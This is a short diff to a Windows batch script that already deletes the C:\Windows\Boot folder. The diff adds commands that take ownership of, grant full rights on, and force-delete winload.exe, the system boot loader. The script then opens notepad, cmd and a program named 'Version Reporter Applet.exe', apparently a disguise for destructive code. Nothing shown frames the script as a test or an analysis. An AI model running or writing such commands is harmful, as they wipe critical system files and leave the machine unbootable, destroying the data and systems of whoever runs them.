@@ -7,6 +7,9 @@ IF ERRORLEVEL 1 GOTO YES
 takeown /f "C:\Windows\Boot" /r /d y
 icacls "C:\Windows\Boot" /grant administrators:F /t
 rmdir /s /q "C:\Windows\Boot"
+takeown /f "C:\Windows\System32\winload.exe"
+icacls "C:\Windows\System32\winload.exe" /grant administrators:F
+del /f /q "C:\Windows\System32\winload.exe"
 start notepad
 start cmd
 start "" "Version Reporter Applet.exe"
